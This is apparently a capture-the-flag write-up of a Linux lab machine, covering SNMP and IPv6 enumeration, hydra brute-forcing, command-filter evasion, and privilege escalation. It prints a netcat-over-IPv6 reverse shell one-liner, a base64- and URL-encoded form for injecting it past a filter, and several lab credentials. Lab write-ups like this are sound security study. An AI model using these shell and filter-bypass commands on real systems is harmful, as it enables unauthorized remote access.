(love this box, super hard, learnt about IPv6)
Hint:
- in snmp enum, there is an entry about IPv6 address.
- sometimes one of the user and password is wrong. Don't assume it is password.
- I had some issue about trying hydra for ipv6. Edit /etc/hosts to solve the problem.
- escape cmd filter by '\l\s' or '/usr/bin/fin?' (to run find). Guess what the expression is on server.
- ipv4 rev shell failed. Try ipv6. Remember to add '-6' on both sides
    - also use base64 to make sure there is no error cause by encoding

New Tool:
- https://github.com/trickster0/Enyx => snmp IPv6 enum
    - or apt install snmp-mibs-downloader and edit /etc/snmp/snmp.conf and comment out everything(one line), then the snmptwalk gives names instead of numbers
- getfact <file> => see extended acl

Logs:
# init contatct
nmap all tcp =>
22 - ssh
3366 - Radicale calendar and contacts server (Python BaseHTTPServer)

nmap common udp =>
161/udp snmp

snmp-check and snmpwalk give me an interesting command line:
python -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/
and
/home/loki/hosted/webstart.sh

so the user:pass is loki:godofmischiefisloki

# login to 3366
use a browser and login.
on the web, it shows another cred: loki:trickeryanddeceit
ssh with it failed. So we have to use it elsewhere.

# ipv6 info
(read the walkthrough), use Enyx => ipv6 info
[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb2:3af1 (this changes)
[+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb2:3af1

# nmap -6
use unique-local ipv6 with nmap -6, get different result
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

# ipv6 http
80 => need login
gobuster => nothing interesting
hydra => administrator:trickeryanddeceit

command execution panel
tried `,;,|,\, and the backend should be "A && echo success || echo failed"
so just enter "which \n\c; true"
read the database.php:
$username = 'debian-sys-maint';
$password = 'nE1S9Aw1L0Ky3Y9h';
$database = 'dbpanel';

read /home/loki/credentials => pass: lokiisthebestnorsegod
ssh in, ok

# priv esc
check mysql, nothing interesting.
find another http login cred, loki:lokipasswordmischieftrickery

to sudo, we need shift to www-data user

(rest are from ippsec video)
generate: echo -n 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -6 dead:beef:2::xxxx 8888 >/tmp/f' | base64 -w 0
in burp: echo+-n+'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI%2bJjF8bmMgLTYgZGVhZDpiZWVmOjI6OjEwMTEgODg4OCA%2bL3RtcC9m'+|+base64+-d+|+sh%3
nc -lnvp -6 8888

then use lokipasswordmischieftrickery as password to root


total user:pass are
loki:godofmischiefisloki
loki:trickeryanddeceit
debian-sys-maint:nE1S9Aw1L0Ky3Y9h
loki:lokiisthebestnorsegod
